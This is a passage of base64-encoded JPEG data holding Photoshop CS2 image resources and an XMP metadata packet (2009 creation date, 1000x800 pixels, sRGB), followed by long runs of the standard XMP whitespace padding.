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kaWZ5RGF0ZT4KICAgICAgICAgPHhhcDpNZXRhZGF0YURhdGU+MjAwOS0xMS0zMFQxMToxODoyMiswMTowMDwveGFwOk1ldGFkYXRhRGF0ZT4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnhhcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyI+CiAgICAgICAgIDx4YXBNTTpEb2N1bWVudElEPnV1aWQ6NjRFMTlGOEY5OEREREUxMUFGQTlFMzg4QzlGRUVDNEY8L3hhcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4YXBNTTpJbnN0YW5jZUlEPnV1aWQ6NjVFMTlGOEY5OEREREUxMUFGQTlFMzg4QzlGRUVDNEY8L3hhcE1NOkluc3RhbmNlSUQ+CiAgICAgICAgIDx4YXBNTTpEZXJpdmVkRnJvbSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgIDxzdFJlZjppbnN0YW5jZUlEPnV1aWQ6NjJFMTlGOEY5OEREREUxMUFGQTlFMzg4QzlGRUVDNEY8L3N0UmVmOmluc3RhbmNlSUQ+CiAgICAgICAgICAgIDxzdFJlZjpkb2N1bWVudElEPnV1aWQ6MDcwREFGQTU4RUREREUxMUFGQTlFMzg4QzlGRUVDNEY8L3N0UmVmOmRvY3VtZW50SUQ+CiAgICAgICAgIDwveGFwTU06RGVyaXZlZEZyb20+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjMwMDAwMDAvMTAwMDA8L3RpZmY6WFJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOllSZXNvbHV0aW9uPjMwMDAwMDAvMTAwMDA8L3RpZmY6WVJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOlJlc29sdXRpb25Vbml0PjI8L3RpZmY6UmVzb2x1dGlvblVuaXQ+CiAgICAgICAgIDx0aWZmOk5hdGl2ZURpZ2VzdD4yNTYsMjU3LDI1OCwyNTksMjYyLDI3NCwyNzcsMjg0LDUzMCw1MzEsMjgyLDI4MywyOTYsMzAxLDMxOCwzMTksNTI5LDUzMiwzMDYsMjcwLDI3MSwyNzIsMzA1LDMxNSwzMzQzMjtFQTEwNzhBQjBCQkY2ODM0OTU4RTQyNTEwNzg5NjQ0QTwvdGlmZjpOYXRpdmVEaWdlc3Q+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj4xMDAwPC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjgwMDwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOkNvbG9yU3BhY2U+MTwvZXhpZjpDb2xvclNwYWNlPgogICAgICAgICA8ZXhpZjpOYXRpdmVEaWdlc3Q+MzY4NjQsNDA5NjAsNDA5NjEsMzcxMjEsMzcxMjIsNDA5NjIsNDA5NjMsMzc1MTAsNDA5NjQsMzY4NjcsMzY4NjgsMzM0MzQsMzM0MzcsMzQ4NTAsMzQ4NTIsMzQ4NTUsMzQ4NTYsMzczNzcsMzczNzgsMzczNzksMzczODAsMzczODEsMzczODIsMzczODMsMzczODQsMzczODUsMzczODYsMzczOTYsNDE0ODMsNDE0ODQsNDE0ODYsNDE0ODcsNDE0ODgsNDE0OTIsNDE0OTMsNDE0OTUsNDE3MjgsNDE3MjksNDE3MzAsNDE5ODUsNDE5ODYsNDE5ODcsNDE5ODgsNDE5ODksNDE5OTAsNDE5OTEsNDE5OTIsNDE5OTMsNDE5OTQsNDE5OTUsNDE5OTYsNDIwMTYsMCwyLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDIwLDIyLDIzLDI0LDI1LDI2LDI3LDI4LDMwOzBDQUM1NzI5RTc0MzNFRDc4RjVDNTdENTc5RTkwQ0Q0PC9leGlmOk5hdGl2ZURpZ2VzdD4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyI+CiAgICAgICAgIDxwaG90b3Nob3A6Q29sb3JNb2RlPjM8L3Bob3Rvc2hvcDpDb2xvck1vZGU+CiAgICAgICAgIDxwaG90b3Nob3A6SUNDUHJvZmlsZT5zUkdCIElFQzYxOTY2LTIuMTwvcGhvdG9zaG9wOklDQ1Byb2ZpbGU+CiAgICAgICAgIDxwaG90b3Nob3A6SGlzdG9yeS8+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI